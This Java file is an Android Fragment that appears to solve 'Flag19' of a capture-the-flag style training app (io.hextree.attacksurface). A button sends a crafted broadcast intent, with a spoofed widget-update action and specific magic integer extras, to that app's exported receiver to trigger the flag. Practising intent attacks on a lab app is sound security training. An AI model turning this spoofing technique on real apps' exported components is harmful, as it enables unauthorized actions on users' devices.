package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class Flag19Fragment extends Fragment {
    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag19, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag19);
        launchButton.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag19Widget"));
            intent.setAction("com.appdev.intentattacks.action.APPWIDGET_UPDATE");
            Bundle bundleExtra = new Bundle();
            bundleExtra.putInt("appWidgetMaxHeight", 1094795585);
            bundleExtra.putInt("appWidgetMinHeight", 322376503);
            intent.putExtra("appWidgetOptions", bundleExtra);
            getContext().sendBroadcast(intent);
        });
        return view;
    }
} 